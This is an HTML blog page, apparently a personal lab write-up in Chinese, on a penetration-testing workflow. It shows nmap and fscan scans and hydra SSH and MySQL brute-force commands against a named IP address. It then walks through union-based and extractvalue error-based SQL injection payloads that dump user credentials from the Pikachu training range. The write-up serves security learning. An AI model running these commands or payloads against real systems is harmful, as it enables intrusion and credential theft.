@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html  lang="zh-CN" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="混口饭吃">
+  <link rel="icon" href="/img/logo.png">
+  <title>渗透测试流程</title>
+  
+  
+  <meta property="og:title" content="渗透测试流程">
+  
+  
+  <meta property="og:url" content="http://example.com/2022/02/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/index.html">
+  
+  
+  <meta property="og:img" content="/img/author.jpg">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2022-02-09">
+  <meta property="og:article:modified_time" content="2022-02-11">
+  <meta property="og:article:author" content="YiHua">
+  
+  
+  <meta property="og:article:tag" content="渗透测试">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/logo.png" alt="logo">
+      
+      <span class="navbar-logo-dsc">混口饭吃</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    首页
+    
+    </a>
+    
+    <a href="/archives" class="navbar-menu-item">
+    
+    归档
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于
+    
+    </a>
+    
+    <a href="/links" class="navbar-menu-item">
+    
+    友链
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      渗透测试流程
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-02-09T13:09:23.506Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2022-02-09</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/渗透测试/" class="post-meta-link">渗透测试</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.4k 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/渗透测试/" class="post-meta-link">渗透测试</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h3 id="一：爆破目标主机服务器"><a href="#一：爆破目标主机服务器" class="headerlink" title="一：爆破目标主机服务器"></a>一：爆破目标主机服务器</h3><p>目标主机 106.55.187.63</p>
+<h4 id="一：信息收集"><a href="#一：信息收集" class="headerlink" title="一：信息收集"></a>一：信息收集</h4><h5 id="1-使用nmap扫描目标主机"><a href="#1-使用nmap扫描目标主机" class="headerlink" title="1.使用nmap扫描目标主机"></a>1.使用nmap扫描目标主机</h5><p>命令</p>
+<pre class="highlight"><span class="line">nmap -T4 -A -v <span class="number">106.55</span>.<span class="number">187.63</span></span><br></pre>
+
+<h6 id="1-主机系统"><a href="#1-主机系统" class="headerlink" title="1.主机系统"></a>1.主机系统</h6><p>llinux操作系统</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209152955266.png" alt="image-20220209152955266" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209152955266.png" class="lozad post-image"></p>
+<h6 id="2-开放端口"><a href="#2-开放端口" class="headerlink" title="2.开放端口"></a>2.开放端口</h6><p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209152718916.png" alt="image-20220209152718916" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209152718916.png" class="lozad post-image"></p>
+<h5 id="2-fscan扫描"><a href="#2-fscan扫描" class="headerlink" title="2.fscan扫描"></a>2.fscan扫描</h5><p>命令</p>
+<pre class="highlight"><span class="line">fscan.exe -h <span class="number">106.55</span>.<span class="number">187.63</span></span><br></pre>
+
+<p>发现web网站</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209162501396.png" alt="image-20220209162501396" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209162501396.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">http:<span class="comment">//106.55.187.63:8002      //登录</span></span><br><span class="line">http:<span class="comment">//106.55.187.63:8001      //pikachu靶场</span></span><br></pre>
+
+<h4 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二:漏洞利用"></a>二:漏洞利用</h4><h4 id="一-端口爆破"><a href="#一-端口爆破" class="headerlink" title="一:端口爆破"></a>一:端口爆破</h4><h5 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h5><p>端口：2222</p>
+<p>攻击方式：爆破(hydra) ，弱口令</p>
+<pre class="highlight"><span class="line">hydra  -L user.txt -P password.txt -vV -t <span class="number">5</span> ssh:<span class="comment">//106.55.187.63:2222 </span></span><br></pre>
+
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209204350239.png" alt="image-20220209204350239" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220209204350239.png" class="lozad post-image"></p>
+<h5 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h5><p>端口：3306</p>
+<p>攻击方式：爆破(hydra) ，弱口令</p>
+<pre class="highlight"><span class="line">hydra  -L user.txt -P password.txt -vV -t <span class="number">5</span> mysql:<span class="comment">//106.55.187.63:3306</span></span><br></pre>
+
+<h5 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h5><p>端口：53</p>
+<p>攻击方式：区域传输漏洞</p>
+<h5 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h5><p>端口：8001</p>
+<p>攻击方式：爆破，弱口令</p>
+<h3 id="三：sql注入练习"><a href="#三：sql注入练习" class="headerlink" title="三：sql注入练习"></a>三：sql注入练习</h3><h4 id="1-字符型注入"><a href="#1-字符型注入" class="headerlink" title="1.字符型注入"></a>1.字符型注入</h4><p>单引号判断注入点和类型</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001035573.png" alt="image-20220211001035573" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001035573.png" class="lozad post-image"></p>
+<p>报错回显 ‘’’ </p>
+<p>单引号闭合的字符型注入 </p>
+<p>2.判断字段数 </p>
+<p>判断字段数为 2</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001134877.png" alt="image-20220211001134877" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001134877.png" class="lozad post-image"></p>
+<p>3.3.使用 mysql 命令 select database()命令返回当前的数据库</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001217895.png" alt="image-20220211001217895" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001217895.png" class="lozad post-image"></p>
+<p>4.利用 information_schema 查询 security 数据库的所有表</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001300911.png" alt="image-20220211001300911" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001300911.png" class="lozad post-image"></p>
+<p>5.查询 security 数据库中 users 中的所有字段</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001327265.png" alt="image-20220211001327265" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001327265.png" class="lozad post-image"></p>
+<p>6.查询登录名称及密码</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001353192.png" alt="image-20220211001353192" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211001353192.png" class="lozad post-image"></p>
+<h4 id="2-数字型注入"><a href="#2-数字型注入" class="headerlink" title="2.数字型注入"></a>2.数字型注入</h4><p>1.burp 抓包测试字段数位 2</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002012864.png" alt="image-20220211002012864" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002012864.png" class="lozad post-image"></p>
+<p>2.使用 mysql 命令 select database()命令返回当前的数据库</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002050586.png" alt="image-20220211002050586" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002050586.png" class="lozad post-image"></p>
+<p>3.抓包查询利用 information_schema 查询 security 数据库的所有表</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002143115.png" alt="image-20220211002143115" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002143115.png" class="lozad post-image"></p>
+<p>4.查询 security 数据库中 users 中的所有字段</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002229405.png" alt="image-20220211002229405" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002229405.png" class="lozad post-image"></p>
+<p>5.查询登录名称及密码</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002310047.png" alt="image-20220211002310047" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211002310047.png" class="lozad post-image"></p>
+<h4 id="3-xxx型注入"><a href="#3-xxx型注入" class="headerlink" title="3.xxx型注入"></a>3.xxx型注入</h4><p>单引号判断是否有注入点和注入类型。直接出现报错。报错内容为 ‘1’’)</p>
+<p>该类型为字符型注入</p>
+<p>暂时可判定运行代码</p>
+<pre class="highlight"><span class="line">select * <span class="keyword">from</span> xxxx where name=（<span class="string">&#x27;$name&#x27;</span>)</span><br></pre>
+
+
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117164752409.png" alt="image-20220117164752409" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117164752409.png" class="lozad post-image"></p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117164830207.png" alt="image-20220117164830207" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117164830207.png" class="lozad post-image"></p>
+<p>尝试进行构造万能语句</p>
+<pre class="highlight"><span class="line"><span class="number">1</span><span class="string">&#x27;)  or  &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or (&#x27;</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117170447419.png" alt="image-20220117170447419" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117170447419.png" class="lozad post-image"></p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117170513508.png" alt="image-20220117170513508" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117170513508.png" class="lozad post-image"></p>
+<p>通过闭合爆出字段数,从一开始依次递增 ，到3时出现数字不存在，说明 字段数为2</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;) order by 3#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117171919621.png" alt="image-20220117171919621" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117171919621.png" class="lozad post-image"></p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117172126769.png" alt="image-20220117172126769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117172126769.png" class="lozad post-image"></p>
+<p>使用union联合查询查出数据库为pikachu</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;) union select 1,database()#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117172417756.png" alt="image-20220117172417756" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117172417756.png" class="lozad post-image"></p>
+<p>查询数据库中的表依次查询</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;) union select table_name,2 from information_schema.tables  where table_schema=database() limit 0,1#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173109197.png" alt="image-20220117173109197" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173109197.png" class="lozad post-image"></p>
+<p>查看pikachu数据库中users表中的字段</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;) union select column_name,2 from information_schema.columns  where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;limit 2,1#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173514831.png" alt="image-20220117173514831" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173514831.png" class="lozad post-image"></p>
+<p>产看用户名和密码</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;) union select username,password from pikachu.users#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173652057.png" alt="image-20220117173652057" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117173652057.png" class="lozad post-image"></p>
+<h4 id="4-”insert-pdate”注入"><a href="#4-”insert-pdate”注入" class="headerlink" title="4.”insert/pdate”注入"></a>4.”insert/pdate”注入</h4><h5 id="1-insert登录页面注入"><a href="#1-insert登录页面注入" class="headerlink" title="1.insert登录页面注入"></a>1.insert登录页面注入</h5><p>单引号报错说明存在漏洞</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117185530149.png" alt="image-20220117185530149" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117185530149.png" class="lozad post-image"></p>
+<p>通过报错注入爆出数据库</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select database()))) or&#x27;</span>   </span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117193512718.png" alt="image-20220117193512718" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117193512718.png" class="lozad post-image"></p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117193527755.png" alt="image-20220117193527755" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117193527755.png" class="lozad post-image"></p>
+<p>爆出表名</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1))) or&#x27;</span> </span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117222815923.png" alt="image-20220117222815923" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117222815923.png" class="lozad post-image"></p>
+<p>再次构建爆出列名</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 2,1))) or&#x27;</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117223347487.png" alt="image-20220117223347487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117223347487.png" class="lozad post-image"></p>
+<p>产看账户密码</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;or extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1,32))or&#x27;</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225119367.png" alt="image-20220117225119367" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225119367.png" class="lozad post-image"></p>
+<h5 id="2-update注入"><a href="#2-update注入" class="headerlink" title="2.update注入"></a>2.update注入</h5><p>性别加入单引号发生错，从报错可以判断存在注入点，并且为整型</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225643127.png" alt="image-20220117225643127" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225643127.png" class="lozad post-image"></p>
+<p>构建payload 爆出数据库为pikachu</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;nd extractvalue(1,concat(0x7e,(database()),0x7e))%23</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230427413.png" alt="image-20220117230427413" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230427413.png" class="lozad post-image"></p>
+<p>获取数据库中的表</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select table_name from</span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1),0x7e))%23</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230707058.png" alt="image-20220117230707058" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230707058.png" class="lozad post-image"></p>
+<p>获取users表中的字段</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select column_name from</span></span><br><span class="line"><span class="string">information_schema.columns where table_schema=&#x27;</span>pikachu<span class="string">&#x27;and table_name&#x27;</span>users<span class="string">&#x27; limit 0,1),0x7e))%23</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230950822.png" alt="image-20220117230950822" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117230950822.png" class="lozad post-image"></p>
+<p>获取密码</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;and extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1,32))#</span></span><br></pre>
+
